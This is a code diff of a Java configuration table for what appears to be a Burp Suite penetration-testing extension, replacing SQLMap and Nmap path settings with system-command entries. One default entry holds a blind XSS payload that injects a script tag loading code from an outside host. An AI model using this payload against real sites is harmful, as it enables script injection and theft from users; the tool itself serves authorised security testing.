@@ -26,13 +26,14 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
-		
-		configEntries.add(new ConfigEntry("SQLMap-Python-Path","",ConfigEntry.Config_Basic_Variable,false,false));
-		configEntries.add(new ConfigEntry("SQLMap-SQLMap.py-Path","",ConfigEntry.Config_Basic_Variable,false,false));
-		configEntries.add(new ConfigEntry("SQLMap-Request-File-Path","D:\\sqlmap-request-files",ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("SQLMap-Options","--risk=3 --level=3",ConfigEntry.Config_Basic_Variable,true,false));
-		
-		configEntries.add(new ConfigEntry("Nmap-File-Path","D:\\Program Files (x86)\\Nmap\\nmap.exe",ConfigEntry.Config_Basic_Variable,true,false));
+
+		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Action_Run_System_Command,true,false));
+		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Action_Run_System_Command,true,false));
+		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
+			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"this config effect sqlmap and nmap"));
+		}else {
+			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,"this config effect sqlmap and nmap"));
+		}
 
 		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
 		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
